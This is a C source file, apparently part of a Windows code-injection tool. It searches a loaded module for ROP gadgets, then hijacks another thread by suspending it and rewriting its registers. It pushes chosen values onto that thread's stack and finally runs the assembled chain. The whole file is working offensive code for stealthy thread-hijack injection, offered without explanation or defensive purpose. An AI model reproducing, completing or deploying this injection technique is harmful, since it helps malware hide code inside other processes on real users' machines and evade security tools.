#include <windows.h>
#include <stdio.h>
#define push(x) pushm(x, thd)

unsigned int pshc; //push edx; call eax
unsigned int jmps; //jmp $
unsigned int ret; //ret

//gadget finder
unsigned int findr(const unsigned char* pattern, int sz, const char* name){
    void* base = GetModuleHandleA(name);
    unsigned char* ptr = (unsigned char*)base;
    ptr+=((PIMAGE_SECTION_HEADER)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew + 248))->VirtualAddress;
    unsigned int virtsize = ((PIMAGE_SECTION_HEADER)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew + 248))->SizeOfRawData;
    unsigned int c=0;
    while(memcmp(pattern, ptr+c, sz)!=0){
        c++;
        if(c>=virtsize) return 0;
    }
    return (unsigned int)(ptr+c);
}

//wait for user time to increase, signify kernel exit, thread can be manipulated
void waitunblock(HANDLE thd){
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;
    while(1){
        Sleep(1);
        GetThreadTimes(thd, &a, &b, &c, &d);
        if(d.dwLowDateTime - pt > 9) break; //when user time is >90% of total time, we're probably done
        pt = d.dwLowDateTime;
    }
    return;
}

//push val to stack, returns address of pushed data
unsigned int pushm(unsigned int data, HANDLE thd){
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Esp += 4;
    ctx.Eip = pshc;
    ctx.Edx = data;
    ctx.Eax = jmps;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
    return ctx.Esp-4;
}

//push val to stack, but returns return val of previous fn called (in eax)
unsigned int getretpush(unsigned int data, HANDLE thd){
    CONTEXT ctx2;
    SuspendThread(thd);
    ctx2.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx2);
    ctx2.Eip = pshc;
    unsigned int addr = ctx2.Eax;
    ctx2.Edx = data;
    ctx2.Eax = jmps;
    SetThreadContext(thd, &ctx2);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
    return addr;
}

//push junk to stack
void opening(HANDLE thd){
    CONTEXT ctx;
    SuspendThread(thd);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Edx = 0;
    ctx.Eip = pshc;
    ctx.Eax = jmps;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(1);
    SuspendThread(thd);
}

//execute the prepared rop sled
void slay(HANDLE thd){
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    ctx.Esp += 4;
    ctx.Eip = ret;
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
}
